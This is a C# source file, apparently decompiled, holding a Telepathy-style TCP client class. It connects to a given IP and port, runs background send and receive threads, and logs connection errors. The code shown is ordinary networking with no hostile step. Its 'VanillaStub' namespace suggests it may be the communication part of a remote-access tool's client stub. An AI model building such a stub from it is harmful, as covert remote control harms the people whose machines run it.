using System;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Threading;

namespace VanillaStub.Helpers.Telepathy;

public class Client : Common
{
	private readonly ManualResetEvent sendPending = new ManualResetEvent(initialState: false);

	private readonly SafeQueue<byte[]> sendQueue = new SafeQueue<byte[]>();

	private volatile bool _Connecting;

	public TcpClient client;

	private Thread receiveThread;

	private Thread sendThread;

	public bool Connected
	{
		get
		{
			if (client != null && client.Client != null)
			{
				return client.Client.Connected;
			}
			return false;
		}
	}

	public bool Connecting => _Connecting;

	private void ReceiveThreadFunction(string ip, int port)
	{
		try
		{
			client.Connect(ip, port);
			_Connecting = false;
			sendThread = new Thread((ThreadStart)delegate
			{
				Common.SendLoop(0, client, sendQueue, sendPending);
			});
			sendThread.IsBackground = true;
			sendThread.Start();
			Common.ReceiveLoop(0, client, receiveQueue, MaxMessageSize);
		}
		catch (SocketException ex)
		{
			Logger.Log("Client Recv: failed to connect to ip=" + ip + " port=" + port + " reason=" + ex);
			receiveQueue.Enqueue(new Message(0, EventType.Disconnected, null));
		}
		catch (Exception ex2)
		{
			Logger.LogError("Client Recv Exception: " + ex2);
		}
		sendThread?.Interrupt();
		_Connecting = false;
		client.Close();
	}

	public void Connect(string ip, int port)
	{
		if (!Connecting && !Connected)
		{
			_Connecting = true;
			client = new TcpClient();
			client.NoDelay = NoDelay;
			client.SendTimeout = SendTimeout;
			receiveQueue = new ConcurrentQueue<Message>();
			sendQueue.Clear();
			receiveThread = new Thread((ThreadStart)delegate
			{
				ReceiveThreadFunction(ip, port);
			});
			receiveThread.IsBackground = true;
			receiveThread.Start();
		}
	}

	public void Disconnect()
	{
		if (Connecting || Connected)
		{
			client.Close();
			receiveThread?.Join();
			sendQueue.Clear();
			client = null;
		}
	}

	public bool Send(byte[] data)
	{
		if (Connected)
		{
			if (data.Length <= MaxMessageSize)
			{
				sendQueue.Enqueue(data);
				sendPending.Set();
				return true;
			}
			Logger.LogError("Client.Send: message too big: " + data.Length + ". Limit: " + MaxMessageSize);
			return false;
		}
		Logger.LogWarning("Client.Send: not connected!");
		return false;
	}
}
